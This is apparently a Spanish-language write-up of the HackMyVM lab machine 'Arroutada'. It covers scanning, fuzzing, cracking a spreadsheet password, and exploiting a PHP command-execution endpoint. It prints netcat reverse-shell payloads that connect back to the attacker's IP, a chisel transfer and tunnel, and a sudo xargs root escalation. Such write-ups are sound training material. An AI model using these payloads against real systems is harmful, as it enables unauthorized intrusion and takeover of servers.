---
title: "Arroutada Writeup - HackMyVM"
date: 2023-11-08
categories: [Writeups, HackMyVM, Easy]
tags: [Linux, Easy, Arroutada, HackmyVM, privesc, fuzz, chisel, port, fordwarding]
image:
   path: /assets/img/posts/arroutada/Arroutada.png
   lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
   alt: Banner Arroutada
---

| Información |
|------------|------------|------------|
| Máquina: Arroutada |
| Creador: RiJaba1 |
| SO: Linux |
| Dificultad: Easy |

## Descubrir IP

Hacemos un escaneo a a la red para descubrir que IP tiene la máquina

```bash
nmap -sP 192.168.0.0/24 | grep "scan"
```
![](/assets/img/posts/arroutada/nmapgrep.png)

Ya tenemos la IP de arroutada: 192.168.0.249

## Enumeración

Realizamos un nmap para ver que servicios están corriendo en la máquina.

``` bash
nmap -sVC 192.168.0.249
```

> El parámetro -sVC es el conjunto de -sV (Service Version, te muestra las versiones de los servicios) y -sC (Script Scan, nos ayuda a encontrar vulnerabilidades conocidas).
{:.prompt-info }

![](/assets/img/posts/arroutada/nmapmaquina.png)

Únicamente vemos un servicio HTTP en el puerto 80, visitamos la página web.

![](/assets/img/posts/arroutada/apreton.png)

Encontramos solo una imagen, miramos en el código fuente de la página en busca de pistas.

![](/assets/img/posts/arroutada/codigofuente.png)

Se encuentra la ruta de la imagen, vamos a ver si hay algo de información dentro del directorio /imgs, no tenemos éxito, solamente se encuentra en ese directorio la imagen "apreton.png" que es la que visualizamos en el index de la página.

Realizamos un dirb a la página y encontramos un directorio llamado /scout

>El directorio me aparece tras hacer dos búsquedas.
>El motivo es que en la primera búsqueda use el diccionario /usr/share/wordlists/common.txt y solo me mostraba el directorio /imgs
>La segunda búsqueda la realicé con el diccionario big.txt y ahí obtuve el output de /scout
{:.prompt-tip }

```bash
dirb http://192.168.0.249 /usr/share/wordlists/dirb/big.txt
```
![](/assets/img/posts/arroutada/dirb.png)

En el directorio /scout encontramos una buena pista

![](/assets/img/posts/arroutada/pista.png)

El texto dice "Hola, Telly,

Acabo de recordar que teníamos una carpeta con algunos documentos compartidos importantes. El problema es que no sé en qué ubicación estaba inicialmente, pero sí sé la segunda ruta. Representado gráficamente: /scout/*** *** /docs/

Con gratitud continua, J1."

Con esto ya sabemos que tenemos que llevar acabo un fuzzing

```zsh
gobuster fuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404 -u http://192.168.0.249/scout/FUZZ/docs
```

> El parámetro -w hace referencia al diccionario a usar
> El parámetro -b especifica que códigos de estado deben ser ignorados
> El parámetro -u hace referencia a la URL a la que vamos a aplicar el fuzzing
{:.prompt-tip }

![](/assets/img/posts/arroutada/fuzz.png)

Encontramos la url /scout/j2/docs, vamos a ella

![](/assets/img/posts/arroutada/j2.png)

Hay un total de 1000 archivos, un archivo txt llamado pass.txt que no contiene nada interesante, archivos sin extensión desde el z1 al z999 y solo tiene contenido el z206, lo descubrimos por el tamaño del archivo, mientras que todos tienen un tamaño de 0 el z206 tiene un tamaño de 27

![](/assets/img/posts/arroutada/z206.png)

Dentro podemos leer: "Ignore z*, please
Jabatito"

Solo nos queda un archivo por ver y es el shellfields.ods

>La extensión ods hace referencia a hojas de cálculo (OpenDocument Spreadsheet)
{:.prompt-info }

Al abrir el archivo shellfields.ods nos encontramos que nos pide una contraseña, vamos a intentar romperla con john.

```zsh
libreoffice2john shellfile.ods > ods.hash
```

>La herramienta[ john the ripper](https://www.kali.org/tools/john/) contiene una utilidad llamada libreoffice2john para obtener los hasesh de archivos de LibreOffice protegidos con contraseña
{:.prompt-info }

Usamos ahora john para romper el hash

```zsh
john -w=/usr/share/wordlists/rockyou.txt ods.hash
```

![](/assets/img/posts/arroutada/john.png)

>Para ver la contraseña usamos `john -show ods.hash`
{:.prompt-info }

![](/assets/img/posts/arroutada/johnshow.png)

Ya tenemos la password del archivo: `john11`, entramos en la hoja de cálculo

![](/assets/img/posts/arroutada/librecalc.png)

Tenemos una nueva ruta, pero al introducirla nos lleva a una página en blanco con código HTTP 200 (que indica que la página cargo con éxito), no vemos nada en el código fuente ni con burpsuite.

Vamos a probar a fuzzear parámetros para comprobar si es vulnerable a ejecución de comandos.

```zsh
gobuster fuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -u 192.168.0.249/thejabasshell.php?FUZZ=pwd --exclude-length 0
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://192.168.0.249/thejabasshell.php?FUZZ=pwd
[+] Method:           GET
[+] Threads:          200
[+] Wordlist:         /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Exclude Length:   0
[+] User Agent:       gobuster/3.1.0
[+] Timeout:          10s
===============================================================
2023/11/04 23:33:23 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=33] http://192.168.0.249/thejabasshell.php?a=pwd
```

Encuentra el término `a`, hacemos un curl para ver si nos devuelve el resultado del `pwd`, eso significaría que es vulnerable a ejecución de código remoto.

```zsh
curl 'http://192.168.0.249/thejabasshell.php?a=pwd'
Error: Problem with parameter "b"
 ```

Nos lanza un error, falta un segundo parámetro, volvemos a hacer fuzzing esta vez sobre el parámetro que falta.

```zsh
gobuster fuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -u "192.168.0.249/thejabasshell.php?a=pwd&b=FUZZ" --exclude-length 33,301
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://192.168.0.249/thejabasshell.php?a=pwd&b=FUZZ
[+] Method:           GET
[+] Threads:          200
[+] Wordlist:         /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Exclude Length:   33,301
[+] User Agent:       gobuster/3.1.0
[+] Timeout:          10s
===============================================================
2023/11/04 23:49:36 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=14] http://192.168.0.249/thejabasshell.php?a=pwd&b=pass
```

Encontramos el segundo parámetro `b=pass`, volvemos a intentar hacer el curl.

```zsh
curl 'http://192.168.0.249/thejabasshell.php?a=pwd&b=pass'
```
![](/assets/img/posts/arroutada/pwd.png)

Nos ejecuta el comando pwd con éxito, es decir, es vulnerable a una ejecución de código remota, vamos a montarnos una rever shell.

Para hacer la rever shell nos ayudaremos de la herramienta https://www.revshells.com/ ya que nos da la posibilidad de codificar la revshell en formato URL.

Dentro de la página añadimos nuestra IP y el puerto que queremos usar para la revshell.

![](/assets/img/posts/arroutada/revip.png)

Más abajo elegimos la shell que queremos crear y lo codificamos como URL

![](/assets/img/posts/arroutada/urlencode.png)

Ponemos el puerto elegido a la escucha, en mi caso es el 4444.

Y mandamos la solicitud a la página en el parámetro `a=` pegamos la revshell codificada en URL seguida del `&b=pass` tal que así: 

```zsh
http://192.168.0.249/thejabasshell.php?a=nc%20192.168.0.162%204444%20-e%20%2Fbin%2Fbash&b=pass
```

Ganamos acceso al servidor web desde la revshell que lanzamos, usaremos el comando `script /dev/null -c bash` para ver el prompt en la terminal.

![](/assets/img/posts/arroutada/scriptbash.png)

Vemos desde el directorio home a un user: `drito`, vamos a intentar pivotar desde el servidor a `drito` hacemos un `sudo -l` sin obtener respuesta interesante, probamos con

```zsh
find / -perm 4000 2>/dev/null
```

>Este comando sirve para encontrar archivos con permisos SUID

Tampoco obtenemos respuesta, buscamos algún tipo de log de comandos haber si hay pistas sin éxito.

Probamos con

```zsh
ss -tlp
```

>El [comando ss](https://www.ochobitshacenunbyte.com/2020/09/01/como-se-usa-el-comando-ss-en-linux/) sirve para mostrar información sobre conexiones de red, [sockets](https://keepcoding.io/blog/que-es-un-socket/) y estadísticas de red.
>Hemos juntado los siguientes parámetros:
>-t, listamos las conexiones TCP
>-l, nos muestra únicamente los sockets que están escuchando
>-p, lista los PID de los procesos
{:.prompt-info }

Encontramos un servicio TCP corriendo localmente en el puerto 8000, procedemos a hacer un [port forwarding](https://es.wikipedia.org/wiki/Redirecci%C3%B3n_de_puertos), la idea es crear un túnel entre el servidor web de Arroutada y nuestra máquina para ver que servicio hay en ese puerto.

Para ello usaremos la herramienta [chisel](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html) 

>Otra opción es usar curl dentro del propio servidor web, desde donde hemos conseguido acceso para listar la información del puerto, pero no lo tenemos instalado, por eso la mejor opción es chisel.

Ahora debemos ver donde se encuentra chisel (en nuestro sistema) y pasarlo a la máquina víctima con wget y con un servicio web.

Primero debemos saber donde se encuentra chisel dentro de nuestra máquina para ello usaremos 

```zsh
which chisel
```
![](/assets/img/posts/arroutada/which.png)

Nos movemos a la carpeta donde se encuentre _(es posible que vosotros la tengáis en /usr/bin/chisel)_, dentro de la carpeta abrimos un servidor HTTP con python3

```zsh
python3 -m http.server 80
```

Ahora en la máquina victima usaremos el wget para pasarnos el chisel desde nuestra máquina a la víctima, es importante que el wget lo realicemos en una carpeta donde tengamos permisos de escritura (carpeta tmp), porque si no dará un error y cerrará al conexión.

Para poder ejecutar y usar el comando chisel en la máquina victima nos tenemos que dar permisos de ejecución con `chmod +x chisel` 

![](/assets/img/posts/arroutada/permchisel.png)

Creamos el chisel server en nuestra máquina

```zsh
chisel server --reverse -p 1234
```

>El comando indica que vamos a iniciar chisel en modo servidor
>El parámetro --reverse se usa para establecer una conexión de túnel inverso
>El parámetro -p indica el puerto de conexión
{:.prompt-info }

Creamos el client en la máquina víctima

```zsh
./chisel client 192.168.0.162:1234 R:8000:127.0.0.1:8000
```

>El comando indica que vamos a iniciar chisel en modo cliente
>El parámetro ip:port indica la IP y el puerto del servidor
>El parámetro R:port:ip:port configra un reenvío del puerto 8000 de la máquina víctima al puerto 8000 de nuestra máquina
{:.prompt-info }

Ahora ya tenemos acceso al puerto, vemos una web con un código.

![](/assets/img/posts/arroutada/localhost.png)

El código parece codificado en lenguaje brainfuck, para decodificarlo nos vamos a [esta página](https://www.dcode.fr/brainfuck-language), descubrimos el texto decodificado 

`all HackMyVM hackers!!`

Buscamos más pistas en el código fuente y encontramos lo siguiente:

![](/assets/img/posts/arroutada/sanitize.png)

Nos metemos en localhost:8000/priv.php y nos encontramos este código

```php
Error: the "command" parameter is not specified in the request body.
/*
$json = file_get_contents('php://input');
$data = json_decode($json, true);
if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}
*/
```

El código permite ejecución de comando remoto, ya que no valida ni verifica el dato _`command`_.

Probamos a usar una revsershell con curl desde el parámetro command:

```zsh
curl -X POST "localhost:8000/priv.php" -d '{"command":"nc -e /bin/bash 192.168.0.162 4321"}'
```

Desde el puerto en escucha 1234 conseguimos pivotar a ditro, usamos: 

```zsh
script /dev/null -c bash
```

y encontramos la flag de user

![](/assets/img/posts/arroutada/userflag.png)

Comenzamos con la escala de privilegios desde el user drito, probamos con un `sudo -l` para comprobar si hay algún binario vulnerable.

Encontramos el binario `xargs` lo buscamos en [GTFObins](https://gtfobins.github.io/)y encontramos una manera de vulnerarlo.

![](/assets/img/posts/arroutada/xargs.png)

con el comando escalamos privilegios

```zsh
sudo xargs -a /dev/null sh
```

Y ya tenemos acceso a la flag de root!

![](/assets/img/posts/arroutada/rootflag.png)

La flag esta codificada con dos sistemas de cifrado, BASE64 y ROT13

Para descifrar el base64 usaremos

```zsh
echo "flag" | base64 -d
```

con el resultado de base64 descifraremos el ROT13 con

```zsh
echo "flag" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

Y como resultado tendremos la flag de root!


